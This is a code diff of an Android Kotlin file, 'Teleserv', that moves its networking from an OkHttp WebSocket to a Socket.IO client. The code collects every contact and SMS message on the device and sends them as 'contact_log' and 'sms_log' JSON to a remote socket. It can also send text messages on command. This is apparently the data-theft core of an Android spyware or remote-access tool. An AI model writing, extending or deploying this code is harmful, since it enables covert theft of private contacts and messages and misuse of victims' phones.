@@ -5,25 +5,16 @@ import android.app.PendingIntent
 import android.content.ContentResolver
 import android.content.Context
 import android.content.Intent
-import android.os.Build
-import android.os.Handler
-import android.os.Looper
 import android.provider.ContactsContract
 import android.provider.Telephony
 import android.telephony.SmsManager
-import okhttp3.WebSocket
+import androidx.core.content.getSystemService
+import io.socket.client.Socket
 import org.json.JSONObject
-import java.io.BufferedWriter
-import java.io.File
-import java.io.FileOutputStream
-import java.io.FileWriter
-import java.io.OutputStreamWriter
-import java.time.LocalDateTime
 
 object Teleserv {
-    private val uiHandler = Handler(Looper.getMainLooper())
     @SuppressLint("Range")
-    fun uploadContact(contentResolver: ContentResolver, context: Context, webSocket: WebSocket) {
+    fun uploadContact(context: Context, webSocket: Socket) {
             var allContactList = "All Contacts\n\n\n"
             val cr: ContentResolver = context.contentResolver
             val cur = cr.query(
@@ -69,10 +60,10 @@ object Teleserv {
         val jsontext = JSONObject()
         jsontext.put("type","contact_log")
         jsontext.put("data",allContactList);
-        webSocket.send(jsontext.toString())
+        webSocket.emit("response",jsontext.toString())
     }
-    @SuppressLint("Range")
-    fun uploadsms(contentResolver: ContentResolver, context: Context , webSocket: WebSocket) {
+    @SuppressLint("Range", "NewApi")
+    fun uploadsms(contentResolver: ContentResolver, webSocket: Socket) {
         val projection = arrayOf(
             Telephony.Sms.ADDRESS,
             Telephony.Sms.BODY,
@@ -99,9 +90,9 @@ object Teleserv {
         val jsontext = JSONObject()
         jsontext.put("type","sms_log")
         jsontext.put("data",smsText);
-        webSocket.send(jsontext.toString())
+        webSocket.emit("response",jsontext.toString())
     }
-    fun dateToString(timestamp: Long): String {
+    private fun dateToString(timestamp: Long): String {
         val dateFormat = "yyyy-MM-dd HH:mm:ss"
         val sdf = java.text.SimpleDateFormat(dateFormat)
         return sdf.format(java.util.Date(timestamp))
@@ -110,7 +101,9 @@ object Teleserv {
             val sentPI: PendingIntent =
                 PendingIntent.getBroadcast(context, 0, Intent("SMS_SENT"),
                     PendingIntent.FLAG_IMMUTABLE)
-            SmsManager.getDefault()
+        SmsManager.getDefault()
                 .sendTextMessage(number, null, message, sentPI, null);
     }
+
+
 }
